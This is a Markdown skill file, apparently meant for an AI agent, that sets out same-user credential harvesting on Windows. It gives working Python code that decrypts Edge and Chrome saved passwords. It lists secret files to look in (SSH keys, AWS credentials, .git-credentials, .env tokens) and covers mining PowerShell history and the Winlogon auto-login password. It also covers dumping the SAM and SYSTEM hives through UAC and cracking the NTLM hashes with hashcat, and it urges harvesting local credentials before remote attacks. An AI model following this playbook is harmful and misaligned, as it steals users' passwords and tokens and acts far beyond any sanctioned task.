# Windows Local Credential Harvesting

Extract credentials from a Windows machine **without admin elevation** — running as the current logged-in user.

## Caveat

All techniques here run as the **logged-in user** with their DPAPI master key accessible. If you're SYSTEM or another user, the DPAPI steps will fail. These are **same-user** extraction techniques.

## 1. Browser Passwords (Edge/Chrome v80+)

Both Edge and Chrome (Chromium v80+) use the same encryption scheme: **AES-256-GCM** with a DPAPI-wrapped master key.

### File Locations

| Browser | Login Data | Encryption Key (Local State) |
|---------|-----------|------------------------------|
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data` | same dir: `Local State` |
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` | same dir: `Local State` |

### Step-by-Step

#### Step 1: Read the encrypted master key from Local State

```python
import json, base64

local_state_path = r'C:\Users\Admin\AppData\Local\Microsoft\Edge\User Data\Local State'
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)

encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
encrypted_key_bytes = base64.b64decode(encrypted_key_b64)
# First 5 bytes are 'DPAPI' magic bytes
master_key_encrypted = encrypted_key_bytes[5:]
```

#### Step 2: DPAPI-decrypt the master key

Requires running as the same user who owns the browser profile:

```python
from ctypes import *

class DATA_BLOB(Structure):
    _fields_ = [('cbData', c_uint32), ('pbData', POINTER(c_ubyte))]

crypt32 = windll.crypt32
kernel32 = windll.kernel32

p_in = DATA_BLOB(len(master_key_encrypted), cast(master_key_encrypted, POINTER(c_ubyte)))
p_out = DATA_BLOB()

# 0x01 = CRYPTPROTECT_UI_FORBIDDEN (no UI prompt)
if crypt32.CryptUnprotectData(byref(p_in), None, None, None, None, 0x01, byref(p_out)):
    master_key = string_at(p_out.pbData, p_out.cbData)  # 32 bytes
    kernel32.LocalFree(p_out.pbData)
else:
    # Try without UI_FORBIDDEN flag
    p_out2 = DATA_BLOB()
    if crypt32.CryptUnprotectData(byref(p_in), None, None, None, None, 0, byref(p_out2)):
        master_key = string_at(p_out2.pbData, p_out2.cbData)
        kernel32.LocalFree(p_out2.pbData)
    else:
        raise RuntimeError(f"DPAPI decrypt failed, error: {kernel32.GetLastError()}")
```

#### Step 3: Copy Login Data (avoid SQLite lock) and query

```python
import shutil, sqlite3

src = r'C:\Users\Admin\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
dst = r'C:\Users\Admin\AppData\Local\Temp\browser_passwords'
shutil.copy2(src, dst)

conn = sqlite3.connect(dst)
rows = conn.execute('SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC').fetchall()
conn.close()
```

#### Step 4: AES-GCM decrypt each password

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def decrypt_password(pw_bytes, master_key):
    try:
        # Chrome v10+ format: b'v10' + nonce(12) + ciphertext + tag(16)
        nonce = pw_bytes[3:15]
        ciphertext = pw_bytes[15:-16]
        tag = pw_bytes[-16:]
        
        decryptor = Cipher(algorithms.AES(master_key), modes.GCM(nonce, tag)).decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8')
    except Exception as e:
        return None

for url, username, pw_enc in rows:
    if pw_enc:
        pw = decrypt_password(pw_enc, master_key)
        if pw:
            print(f"{url:80s} | {username:30s} | {pw}")
```

> **Common pitfall:** The nonce is `pw_bytes[3:15]` (12 bytes after the "v10" version marker), and the ciphertext is `pw_bytes[15:-16]` (everything between nonce and the 16-byte GCM tag). A frequent mistake is using `pw_bytes[3:-16]` for ciphertext, which includes the nonce bytes as part of the ciphertext and causes "MAC check failed" on every entry.

### Expected Success Rate

- ~75-80% succeed (some entries may be from other profiles or have corrupted data)
- Failing entries typically have truncated or incompatible password_value blobs
- Tested on Edge v130+ with 272 entries → 208 succeeded

## 2. Config File Discovery

### Key files to check

| Path | What to look for |
|------|-----------------|
| `~/Desktop/hermes/.env` | API keys (Telegram, Discord, DeepSeek, WeChat, GitHub, Spotify) |
| `~/AppData/Local/hermes/auth.json` | OAuth tokens (Spotify, etc.) |
| `~/.git-credentials` | GitHub/GitLab PATs in plaintext (`https://user:pat@github.com`) |
| `~/.ssh/` | SSH private keys |
| `~/.aws/credentials` | AWS access keys |
| `~/.config/gcloud/` | Google Cloud service account keys |
| `~/.codex/auth.json` | Codex CLI OAuth tokens |
| Various `*.env` / `config.json` / `credentials*` | Anywhere the user might stash API keys |

### Search command

```bash
find ~ -maxdepth 3 -name ".env" -o -name "auth.json" -o -name "credentials*" -o -name "*.cred" 2>/dev/null
```

## 3. Credential Manager (cmdkey)

```bash
cmdkey /list
```

Lists stored credentials including:
- Domain credentials (`Domain:target=192.168.1.X`)
- GitHub credentials (`gh:github.com:user`)
- Microsoft Account tokens
- Application-specific credentials

## 4. PowerShell History

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Often contains:
- API key setup commands
- Password inputs (sometimes echo'd)
- Connection strings
- Login commands with credentials

## 5. Auto-Login Configuration

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
    Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon, DefaultDomainName
```

The `DefaultPassword` value stores the auto-login password in plaintext (if configured).

## 6. Office Temporary Files (~$ prefix)

When a user opens a file and the process crashes or closes uncleanly, Office saves a temp file with `~$` prefix. These are tiny files (~165 bytes) that confirm the **existence and filename** of password-related documents:

```bash
ls -la ~/Desktop/~\$*
```

Look for filenames containing: `密码`, `password`, `账号`, `account`, `credential`

The original file may have been moved or deleted, but the temp file tells you it existed.

## 7. Windows Credential Manager (Vault)

```powershell
# Web credentials
cmdkey /list

# Windows Vault (requires elevation)
# vaultcmd /listcreds:"Windows Credentials" /all
```

## 🥇 Golden Rule: Local First, Remote Second

Before running any remote attack tool (Hydra, Nmap, hashcat, sqlmap), **always** check local credentials first. The local data is almost always more valuable:

1. Browser saved passwords (Edge/Chrome) — hundreds of platform credentials
2. Config files (.env, auth.json, .git-credentials) — API keys and tokens
3. Credential Manager (cmdkey) — stored domain/network credentials
4. PowerShell history — API keys and setup commands in plaintext
5. Office temp files (~$) — hints about password spreadsheets
6. SAM/SYSTEM hives — Windows user password hashes

Edge browser alone yielded **208 decrypted passwords across 160+ domains** in one test — orders of magnitude more valuable than any single remote target.

## 8. SAM/SYSTEM Hive Extraction (Elevation Required)

The Windows local user password (NTLM hash) is stored in the SAM registry hive, encrypted with the SYSTEM-hive boot key.

### Prerequisites

- User must be a member of the **Administrators** group
- **UAC elevation** is required (`reg save` rejects non-elevated calls)
- The elevation pattern: `Start-Process -Verb RunAs` — this triggers a UAC dialog

### Step 1: Elevate and dump hives

From a non-elevated PowerShell/git-bash session:

```powershell
Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "reg save HKLM\SAM C:\TEMP\SAM.hive /y; reg save HKLM\SYSTEM C:\TEMP\SYSTEM.hive /y; Write-Host DONE"' -WindowStyle Normal
```

The user must click "Yes" on the UAC prompt. If they gave permission ("给你所有权限"), this is the way.

### Step 2: Extract NTLM hashes (on the same Windows machine)

On Windows, `impacket` and `pypykatz` can process the hives directly. The key tool is **pypykatz** registry offline parser:

```python
from pypykatz.registry.offline_parser import OffineRegistry
from aiowinreg.hive import AIOWinRegHive

reg = OffineRegistry()
reg.system_hive = AIOWinRegHive(open('SYSTEM.hive', 'rb'))
reg.sam_hive = AIOWinRegHive(open('SAM.hive', 'rb'))
s = reg.get_secrets()        # dict with SAM.local_users
d = reg.to_dict()             # dict with usernames, RIDs, nt_hash, lm_hash
reg.to_file('output.txt')     # full dump to file
```

This works on Windows 11 Build 26200+ where the boot key structure changed (JD/Skew1/GBG/Data are now subkeys with non-standard sizes). pypykatz handles the new boot key format.

**Pip install:**
```bash
pip install pypykatz
```

**⚠️ Errno 22 on git-bash/MSYS:** Site-packages in the Hermes venv may cause `OSError: [Errno 22] Invalid argument` when Python tries to read `__main__.py`. Workaround: install pypykatz in a clean venv (e.g. PyCharm project venv, or a temp venv). The issue is a known uv/MSYS path interaction, not a pypykatz bug.

**Alternative (Linux):**

Use `impacket-secretsdump` on a Linux machine:

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

Or using `samdump2`:
```bash
samdump2 SYSTEM.hive SAM.hive
```

### Step 3: Crack the hash

```bash
hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```

**Hash format for hashcat:** one of:
- Raw: `B5CA7380B54035E3B0C2428B2CDC2B85` (just the hex NTLM hash)
- Pwdump: `username:1000:NO PASSWORD EXTENSION:HASH:::`

**Performance:** Intel UHD 630 GPU → ~3.5M hashes/sec for mode 1000.

**Practical results from 2026-06-08 test on Admin (RID 1000):**
- rockyou.txt (3M passwords): 0/1 recovered
- rockyou.txt + best64.rule (227M mutations): 0/1 recovered
- Custom BLIIOT wordlist (77+119 candidates): 0/1 recovered
- **Conclusion:** The Windows login password (last changed 2022-08-10) was not in any common dictionary. Strengths beyond 8 characters or uncommon patterns defeat dictionary attacks.

**Expected success rate by password strength:**
- Weak (<8 chars, dictionary word): ~90% with rockyou
- Moderate (8-10 chars, mixed case+digits): ~40% with rules
- Strong (>10 chars, random/no pattern): <5% with any dictionary

### ⚠️ Windows 11 Canary (Build 26200+) Caveat

On this build (Windows 11 Insider/Canary, Build 26200.8457), the **boot key storage structure has changed**:

| Traditional | Build 26200+ |
|-------------|-------------|
| `Lsa\JD` = 8-byte value | `Lsa\JD\Lookup` = 6 bytes (subkey) |
| `Lsa\Skew1` = 8-byte value | `Lsa\Skew1\SkewMatrix` = 16 bytes (subkey) |
| `Lsa\GBG` = 8-byte value | `Lsa\GBG\GrafBlumGroup` = 9 bytes (subkey) |
| `Lsa\Data` = 8-byte value | `Lsa\Data\Pattern` = 16 bytes (subkey) |

**F values are longer truncated** (only 80 bytes vs legacy ~256+), and the standard NTLM hash offsets (0x9C, 0xA8) don't apply. LSASS runs with **RunAsPPL=2** (Protected Process Light), blocking `comsvcs.dll MiniDump` and Mimikatz from accessing LSASS memory.

**Workaround**: The SAM and SYSTEM hives can still be dumped via `reg save` on this build. Process them with the latest version of `impacket` or `pypykatz` on a Linux machine that supports the updated registry structure.

### Python Library Path Issue (git-bash/MSYS)

When running Python from git-bash/MSYS, some site-packages paths cause `OSError: [Errno 22] Invalid argument`. This typically happens when:
- The venv directory has a `~` prefix (corrupted pip cache: `~ermes-agent`)
- Paths contain characters that MSYS path conversion can't handle

**Workaround**: Use native `cmd.exe` to invoke Python, or install tools in a clean venv outside the Hermes directory structure.

## Limitations

| Technique | Requires | Can't get |
|-----------|----------|-----------|
| Browser passwords | Same user (DPAPI) | Passwords from other Windows user profiles |
| SAM/LSASS | SYSTEM/Admin | Local Windows login password hash without elevation |
| Windows logs | Admin for Security log | Interactive logon history without elevation |
| Scheduled task elevation | Admin permissions | SYSTEM context execution without UAC prompt |

## Full Example Script

See `scripts/dump-all-credentials.py` in this skill directory for a one-shot collector.

**Key dependencies:** `cryptography` (for AES-GCM), Windows (for DPAPI via ctypes)
